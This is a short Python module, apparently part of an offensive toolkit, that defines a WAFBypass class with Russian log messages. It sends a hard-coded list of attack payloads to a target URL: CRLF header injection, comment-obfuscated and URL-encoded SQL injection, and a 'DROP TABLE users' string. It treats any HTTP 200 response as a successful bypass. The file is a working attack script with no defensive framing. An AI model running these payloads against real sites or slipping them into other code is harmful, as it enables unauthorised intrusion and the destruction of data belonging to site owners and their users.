import random
import aiohttp
from utils.logger import log

class WAFBypass:
    def __init__(self):
        self.payloads = [
            "%0d%0aX-Forwarded-For: 127.0.0.1",
            "/?id=1/*!union*/select 1,2,3--",
            "GET /?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54",
            "User-Agent: %27%3B%20DROP%20TABLE%20users%3B%20--"
        ]

    async def try_bypass(self, target_url):
        log(f"[WAFBypass] Пробуем обойти WAF на {target_url}")
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads:
                try:
                    async with session.get(target_url + payload, timeout=5) as resp:
                        if resp.status == 200:
                            log(f"[WAFBypass] Успех: payload {payload}")
                            return True
                except Exception as e:
                    log(f"[WAFBypass] Ошибка: {e}")
        return False
